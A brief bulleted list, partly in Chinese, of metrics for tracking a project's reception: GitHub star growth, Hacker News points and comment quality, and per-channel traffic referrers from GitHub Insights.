- GitHub stars 增量
- HN 点数和 comment 质量
- 各渠道 traffic referer（GitHub Insights → Traffic）
